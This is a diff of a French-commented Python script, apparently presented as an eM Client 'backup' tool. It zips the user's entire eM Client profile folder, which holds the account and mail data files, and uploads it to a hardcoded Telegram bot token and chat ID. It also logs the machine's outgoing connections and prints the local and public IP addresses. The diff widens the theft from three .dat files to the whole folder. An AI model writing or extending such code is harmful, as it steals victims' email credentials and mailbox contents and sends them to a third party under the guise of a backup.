@@ -1,7 +1,6 @@
 import os
 import shutil
 import zipfile
-import hashlib
 import requests
 import tempfile
 import psutil
@@ -14,27 +13,8 @@ import urllib.request
 # === CONFIGURATION ===
 BOT_TOKEN = "7245404963:AAEMlPlsjsULU5uYVvUH4GxS1QSgfVh9mn0"
 CHAT_ID = "513947114"
-FICHIERS = ["accounts.dat", "main.dat", "settings.dat"]
-NOM_ZIP = "eMClient_Backup.zip"
+NOM_ZIP = "eMClient_FullBackup.zip"
 # ======================
-
-def get_file_hash(filepath):
-    h = hashlib.md5()
-    with open(filepath, 'rb') as f:
-        while chunk := f.read(8192):
-            h.update(chunk)
-    return h.hexdigest()
-
-def remove_duplicates(folder_path):
-    hashes = {}
-    for filename in os.listdir(folder_path):
-        filepath = os.path.join(folder_path, filename)
-        if os.path.isfile(filepath):
-            file_hash = get_file_hash(filepath)
-            if file_hash in hashes:
-                os.remove(filepath)
-            else:
-                hashes[file_hash] = filename
 
 def detect_outgoing_connections(process_name="MailClient.exe"):
     log = []
@@ -58,89 +38,74 @@ def chercher_dossier_emclient():
             return os.path.join(roaming_path, dossier)
     return None
 
-def exporter_et_envoyer():
+def afficher_info_reseau():
+    print("\n=== Informations Réseau Locale ===\n")
+
+    try:
+        hostname = socket.gethostname()
+        print(f"Nom de la machine : {hostname}")
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip_locale = s.getsockname()[0]
+        s.close()
+        print(f"Adresse IPv4 locale : {ip_locale}")
+    except:
+        print("Impossible d'obtenir l'IP locale.")
+
+    try:
+        ip_publique = urllib.request.urlopen('https://api.ipify.org').read().decode()
+        print(f"Adresse IP publique : {ip_publique}")
+    except:
+        print("Impossible d'obtenir l'IP publique.")
+
+    systeme = platform.system()
+    if systeme == "Windows":
+        print("\nDétails réseau (ipconfig) :\n")
+        subprocess.run(["ipconfig"], shell=True)
+    else:
+        subprocess.run(["ifconfig"], shell=False)
+
+def exporter_dossier_complet_et_envoyer():
     try:
         emclient_path = chercher_dossier_emclient()
         if not emclient_path:
-            print("Dossier cible introuvable.")
-            return  # eM Client introuvable
+            print("❌ Dossier eM Client introuvable.")
+            return
 
         temp_dir = tempfile.mkdtemp()
-        zip_path = os.path.join(temp_dir, NOM_ZIP)
+        backup_dir = os.path.join(temp_dir, "eMClientBackup")
+        shutil.copytree(emclient_path, backup_dir)
 
-        # Copier les fichiers .dat
-        for nom_fichier in FICHIERS:
-            src = os.path.join(emclient_path, nom_fichier)
-            dst = os.path.join(temp_dir, nom_fichier)
-            if os.path.exists(src):
-                shutil.copy2(src, dst)
-
-        # Nettoyage des doublons
-        remove_duplicates(temp_dir)
-
-        # IPs sortantes
+        # Ajouter journal IP si actif
         ip_logs = detect_outgoing_connections()
-        with open(os.path.join(temp_dir, "fuite_ip.txt"), "w") as f:
+        with open(os.path.join(backup_dir, "fuite_ip.txt"), "w") as f:
             f.write("\n".join(ip_logs) if ip_logs else "Aucune connexion sortante détectée.")
 
-        # Créer ZIP
-        with zipfile.ZipFile(zip_path, 'w') as zipf:
-            for file_name in os.listdir(temp_dir):
-                if file_name != NOM_ZIP:
-                    zipf.write(os.path.join(temp_dir, file_name), file_name)
+        zip_path = os.path.join(temp_dir, NOM_ZIP)
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, _, files in os.walk(backup_dir):
+                for file in files:
+                    abs_path = os.path.join(root, file)
+                    rel_path = os.path.relpath(abs_path, backup_dir)
+                    zipf.write(abs_path, rel_path)
 
-        # Envoi Telegram
         with open(zip_path, "rb") as f:
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                data={"chat_id": CHAT_ID, "caption": f"📦 Backup eM Client - {datetime.datetime.now().strftime('%d/%m/%Y')}"},
+                data={"chat_id": CHAT_ID, "caption": f"📦 Backup complet eM Client - {datetime.datetime.now().strftime('%d/%m/%Y')}"},
                 files={"document": f}
             )
-        print("IP trouvé avec succès.")
+
+        print("✅ Backup complet envoyé.")
     except Exception as e:
-        print(f"Erreur durant l’export/envoi : {e}")
+        print("Erreur :", e)
     finally:
         try:
             shutil.rmtree(temp_dir)
         except:
             pass
 
-def afficher_info_reseau():
-    print("\n=== Informations Réseau Locale ===\n")
-
-    # Nom machine
-    hostname = socket.gethostname()
-    print(f"Nom de la machine : {hostname}")
-
-    # Adresse IPv4 locale (plus fiable)
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip_locale = s.getsockname()[0]
-        s.close()
-        print(f"Adresse IPv4 locale : {ip_locale}")
-    except Exception:
-        print("Impossible de déterminer l'adresse IPv4 locale.")
-
-    # Adresse IP publique
-    try:
-        ip_publique = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
-        print(f"Adresse IP publique : {ip_publique}")
-    except Exception:
-        print("Impossible de déterminer l'adresse IP publique.")
-
-    # Informations réseau supplémentaires selon OS
-    systeme = platform.system()
-    if systeme == "Windows":
-        print("\nConfiguration réseau complète (ipconfig) :\n")
-        subprocess.run(["ipconfig"], shell=True)
-    else:
-        print("\nConfiguration réseau complète (ifconfig ou ip) :\n")
-        try:
-            subprocess.run(["ifconfig"], shell=False)
-        except Exception:
-            subprocess.run(["ip", "addr"], shell=False)
-
 if __name__ == "__main__":
-    exporter_et_envoyer()
+    exporter_dossier_complet_et_envoyer()
     afficher_info_reseau()
